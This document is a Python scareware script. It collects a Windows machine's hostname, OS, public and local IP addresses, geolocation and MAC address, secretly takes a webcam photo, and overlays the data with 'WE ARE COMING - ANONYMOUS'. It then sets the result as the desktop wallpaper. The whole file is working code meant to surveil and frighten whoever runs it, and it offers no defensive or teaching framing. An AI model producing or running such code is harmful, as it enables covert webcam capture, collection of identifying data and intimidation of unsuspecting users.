from PIL import Image, ImageDraw
from PIL import ImageFont, ImageDraw, Image
import ctypes
from uuid import getnode as get_mac
import subprocess
import socket
from requests import get
import datetime
import json
import os
import sys
import platform
import time
from PIL import Image
import cv2 as cv
import PIL.ImageOps
from PIL import Image

#Operating System Information
print('Getting System Information...')
my_os = platform.system()
my_os_extra = sys.platform

#Get Timezone Information
print('Getting Timezone Information...')
now = datetime.datetime.now()
local_now = now.astimezone()
local_tz = local_now.tzinfo
local_tzname = local_tz.tzname(local_now)

#Public IP Configuration
print('Requesting IPV4 Adress from api.ipify.org...')
get_ip = get('https://api.ipify.org').content.decode('utf8')
print('Requesting IPV6 Adress from api.ipify.org...')
get_ipv6 = get('https://api64.ipify.org').content.decode('utf8')

#IP JSON Configuration
print('Requesting IP Adress Information From ip-api.com...')
ip_json = get(f'http://ip-api.com/json/{get_ip}?fields=continent,country,region,regionName,city,district,zip,lat,lon,isp,reverse,proxy')
y = ip_json.json()

#Extract Details From IP ip-api JSON
print('Parsing JSON Data From API Request...')
country_code = y['country']

latstring = str(y['lat'])
longstring = str(y['lon'])

ip_coords = latstring + ' ' + longstring

#Local IP Configuration
print('Getting Local Network IP...')
hostname=socket.gethostname()   
IPAddr=socket.gethostbyname(hostname)

#Local MAC Configuration
print('Grabbing MAC Adress...')
mac_adress = get_mac()

#Assign Content Variables
content = f"Device Name: {hostname}\n"
content += f"Operating System: {my_os}, {my_os_extra}\n"
content += f"Country: {country_code}\n"
content += f"System Timezone: {local_tzname}\n"
content += f"System Time: {now}\n"
content += f"Public IPV4 Adress: {get_ip}\n"
content += f"Public IPV6 Adress: {get_ipv6}\n"
content += f"Local IP Adress: {IPAddr}\n"
content += f"local MAC Adress: {mac_adress}\n"
content += "\n\nWE ARE COMING\n\n"
content += "- ANONYMOUS"

#Take image from webcam
cam = cv.VideoCapture(0)   
s, img = cam.read()
cv.imwrite("C:/tmp/scare.jpg",img)
base_image = Image.open('C:\\tmp\\scare.jpg')

#Invert colours
base_image = base_image.convert("L")
base_image = PIL.ImageOps.invert(base_image)
base_image = base_image.convert("RGBA")


#Get centre of image
width = base_image.size[0]
height = base_image.size[1]

triple_height = height*3
triple_width = width*3

centre_width = triple_width/1.8
centre_height = triple_height/2

#Resize Image
base_image = base_image.resize((triple_width, triple_height))

#Draw text over image
text_size = triple_width/60
text_size = int(text_size)

print(text_size)

draw = ImageDraw.Draw(base_image, "RGBA")
font = ImageFont.truetype("arial.ttf", text_size)
draw.text((centre_width, centre_height), content, fill=(255, 0, 0, 255), font=font, anchor="mm",)
base_image.save("C:\\tmp\\scary.png")

#Set As Desktop Background
ctypes.windll.user32.SystemParametersInfoW(20, 0, "C:\\tmp\\scary.png" , 0)
os.remove('C:\\tmp\\scare.jpg')


